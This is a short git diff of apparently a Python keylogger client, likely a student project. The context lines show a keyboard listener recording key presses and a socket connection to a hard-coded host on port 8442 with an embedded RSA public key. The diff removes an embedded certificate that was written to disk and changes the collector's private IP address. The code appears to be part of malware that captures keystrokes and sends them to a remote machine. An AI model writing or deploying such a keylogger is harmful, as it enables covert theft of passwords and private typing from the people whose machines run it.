@@ -57,11 +57,6 @@ def stop_client(conn, listener, filepath):
 
 def create_conn(host, port):
 
-    cert = "-----BEGIN CERTIFICATE-----\nMIIDiTCCAnECFF9ynFXakoPMAdwpwluM/58FsGZtMA0GCSqGSIb3DQEBCwUAMIGA\nMQswCQYDVQQGEwJGUjEOMAwGA1UECAwFUGFyaXMxDjAMBgNVBAcMBVBhcmlzMQ0w\nCwYDVQQKDARFU0dJMQswCQYDVQQLDAJJVDESMBAGA1UEAwwJbG9jYWxob3N0MSEw\nHwYJKoZIhvcNAQkBFhJtaWNobWljaEBnbWFpbC5jb20wHhcNMjMxMTE2MTUxMzU2\nWhcNMjMxMjE2MTUxMzU2WjCBgDELMAkGA1UEBhMCRlIxDjAMBgNVBAgMBVBhcmlz\nMQ4wDAYDVQQHDAVQYXJpczENMAsGA1UECgwERVNHSTELMAkGA1UECwwCSVQxEjAQ\nBgNVBAMMCWxvY2FsaG9zdDEhMB8GCSqGSIb3DQEJARYSbWljaG1pY2hAZ21haWwu\nY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAx+4arLNwSnT6j/1R\npSUAUzXdKEIzYgqllmzGw8un6o+iNrCqrgI4tsAtQGHI17fpdCV4FTbR8TVMJnhd\nBWSmF7evvRVpZDeLNEPWn2FWCDDNhbmnlIFZ9OWvxfOZZwijfEcqyX9V4cJWVbjJ\n3URiTal59cFqqDoj3/nipAhu1eCcGzbLVxZ9Ez1pOu3oXjWsySh/zu4Tgkn6tI5e\naQ4wdIQDst3HuEU7Qk+UGj5GFmqkbWkh7G5qfRPEMDXHWBoCB5W95NdXTYahLTyz\nNU9kMNB692/IS/1El0Ty3SDJf7+eRsP33JtOqb1ypcVZXTNLTBkTsDHL1iUUkr9X\nt8yhvQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQA8sWuGOh6ettcLfkxL2m1k5Tb6\ns/i0c2cjPH7sdQmMkfZouWNZ6zRdtTHtrdEzHNQTvIWl2mfLvgvcnE3bn1PSgL14\n8Tv6QizFliwo1y8JJuq/1Y3CMVCVC2zO12Gv6mCn0yVLf579MsdRnAHiKdgjM6KC\nihlMIJ4vOZUhQCeRSoD7jsG5sXbhqz2F257Vu0V2/h8+zAsODGdccXZ90uqc1AWe\nOucZVQ+mWDqhgQpfVVRqAoQRyrVCBKWZCd2ABYCYVBUimQi0PIzWG1GBbX8hMbSo\ncvczWg3qh4YQukhtsjnwRPSHOlQxpGwvCfPY9p79Q8Ipx98lMDMfzDSbWxia\n-----END CERTIFICATE-----"
-
-    with open('./cert.pem', 'w') as f:
-        f.write(cert)
-
     # création du socket
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client_socket.settimeout(3.0)
@@ -101,7 +96,7 @@ listener = keyboard.Listener(on_press=record_key)
 listener.start()
 
 
-host = '172.16.120.1'
+host = '192.168.0.35'
 port = 8442
 
 pubkey = '''-----BEGIN RSA PUBLIC KEY-----
